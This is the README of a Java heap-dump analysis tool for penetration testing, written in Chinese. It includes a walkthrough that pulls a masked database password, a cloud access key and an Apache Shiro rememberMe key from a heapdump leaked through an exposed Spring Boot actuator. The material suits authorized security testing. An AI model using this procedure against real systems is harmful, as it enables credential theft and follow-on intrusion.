# heapdump_tool

```
声明： 此工具仅用于企业安全人员自查验证自身企业资产的安全风险，或有合法授权的安全测试，请勿用于其他用途，如有，后果自负。
下载地址：https://share.feijipan.com/s/dFAuqYQy

+ 20230425
+ 输出内容会写到当前目录下 文件名_output.txt，方便随时查询
+ 新增功能hashtable读取，可获取比较多的信息, 结果展示优化
+ 新增2个功能systemproperties,allproperties，读取properties数据


+ 20230406
+ 新增shirokey查找识别，输入shirokey即可
+ class方式信息模糊查询， 例如 class=shiro.web.mgt ,  class=redis 可以搜到redis相关的配置, 等等，class方式可以挖出来更多的数据，大家自己尝试

+ 使用体感和部分功能调优。
+ 对gz文件自动解压
+ 增加了模式选择，大于15W数据时，可以选择模式0 ，不用加载所有数据，直接快速查询数据


该工具是基于jhat，通过jhat解析heapdump文件，所以需要安装jdk和配置好环境变量，例如win \Java\jdk8\bin\jhat.exe， 
在控制台输入jhat检查是否安装正确。

usage:> java -jar heapdump_tool.jar  heapdump
查询方式：
1. 关键词       例如 password 
2. 字符长度     len=10    获取长度为10的所有key或者value值
3. 按顺序获取   num=1-100 获取顺序1-100的字符
4. class模糊搜索  class=xxx 获取class的instance数据信息
5. id查询       id=0xaaaaa  获取id为0xaaaaa的class或者object数据信息
4. re正则查询    re=xxx  自定义正则查询数据信息
获取url,file,ip
shirokey 获取shirokey的值
geturl   获取所有字符串中的url
getfile  获取所有字符串中的文件路径文件名
getip    获取所有字符串中的ip
默认不输出查询结果非key-value格式的数据，需要获取所有值，输入all=true，all=false取消显示所有值。

----------------------------------------------------

常见的heapdump泄露，大多都是spring heapdump泄露

这里以spring heapdump泄露 为例

访问 /actuator/env  得到部分信息如下

properties: {
spring.datasource.driver-class-name: {
value: "com.mysql.cj.jdbc.Driver",
origin: "URL [file:/home/test/deploy/config/application-pressure.yml]:3:24"
},
spring.datasource.url: {
value: "jdbc:mysql://test.mysql.rds.aliyuncs.com:3306/test?useUnicode=true&characterEncoding=utf-8&useTimezone=true&serverTimezone=GMT%2B8",
origin: "URL [file:/home/test/deploy/config/application-pressure.yml]:4:10"
},
spring.datasource.username: {
value: "root",
origin: "URL [file:/home/test/deploy/config/application-pressure.yml]:5:15"
},
spring.datasource.password: {
value: "******",
origin: "URL [file:/home/test/deploy/config/application-pressure.yml]:6:15"
},

页面返回内容 spring.datasource.password 的值为 *******

下载 heapdump 文件， 然后使用工具
root@wy:~# 
> java -jar heapdump_tool.jar  heapdump.6
[-] Start jhat, waiting...
[-] fing object count: 100000
[-] too many object,please input 0/1 to choose mode.
0. (search data, may can't find some data, can't use function num=,len=).
1. (load all object, need wait a few minutes).
> 0
[-] please input keyword value to search, example: password,re=xxx,len=16,num=0-10,id=0x123a,class=org.xx,all=true,geturl,getfile,getip,shirokey,systemproperties,allproperties,hashtable input q/quit to quit.
> spring.datasource.password
[-] Start find keyword: spring.datasource.password
>> spring.datasource.password -> test@wyzxxz 
[-] please input keyword value to search, example: password,re=xxx,len=16,num=0-10,id=0x123a,class=org.xx,all=true,geturl,getfile,getip,shirokey,systemproperties,allproperties,hashtable input q/quit to quit.
> accesskey
[-] Start find keyword: accessKey
>> ConnectionProperties.noAccessToProcedureBodies -> When determining procedure parameter types for CallableStatements, and the connected user can&#039;&#039;t access procedure bodies through &quot;SHOW CREATE PROCEDURE&quot; or select on mysql.proc should the driver instead create basic metadata
>> accessKey -> LTA**************
[-] please input keyword value to search, example: password,re=xxx,len=16,num=0-10,id=0x123a,class=org.xx,all=true,geturl,getfile,getip,shirokey,systemproperties,allproperties,hashtable input q/quit to quit.
> shirokey
>> kPH+bIxk5D2deZiIxcaaaA==
[-] please input keyword value to search, example: password,re=xxx,len=16,num=0-10,id=0x123a,class=org.xx,all=true,geturl,getfile,getip,shirokey,systemproperties,allproperties,hashtable input q/quit to quit.
> class=shiro.web.mgt
- > org.apache.shiro.web.mgt.CookieRememberMeManager
- - - -> org.apache.shiro.crypto.AesCipherService
- - - - - - - -> algorithmName -> AES
- - - - - - - -> blockSize -> 0
- - - - - - - -> generateInitializationVectors -> true
- - - - - - - -> initializationVectorSize -> 128
- - - - - - - -> keySize -> 128
- - - - - - - -> modeName -> CBC
- - - - - - - -> paddingSchemeName -> PKCS5Padding
- - - - - - - -> secureRandom -> &lt;null&gt;
- - - - - - - -> streamingBlockSize -> 8
- - - - - - - -> streamingBufferSize -> 512
- - - - - - - -> streamingModeName -> CBC
- - - - - - - -> streamingPaddingSchemeName -> PKCS5Padding
- - - - - - - -> streamingTransformationString -> &lt;null&gt;
- - - - - - - -> transformationString -> &lt;null&gt;
- - - -> cipherService ->
- - - -> org.apache.shiro.web.servlet.SimpleCookie
- - - - - - - -> comment -> &lt;null&gt;
- - - - - - - -> domain -> &lt;null&gt;
- - - - - - - -> httpOnly -> true
- - - - - - - -> maxAge -> 31536000
- - - - - - - -> name -> rememberMe
- - - - - - - -> path -> &lt;null&gt;
- - - - - - - -> secure -> false
- - - - - - - -> value -> &lt;null&gt;
- - - - - - - -> version -> -1
- - - -> cookie ->
- - - -> decryptionCipherKey -> xxxx
- - - -> encryptionCipherKey -> xxxx
- - - -> org.apache.shiro.io.DefaultSerializer
- - - -> serializer ->
[-] please input keyword value to search, example: password,re=xxx,len=16,num=0-10,id=0x123a,class=org.xx,all=true,geturl,getfile,getip,shirokey input q/quit to quit.
> q
[-] exit.



```



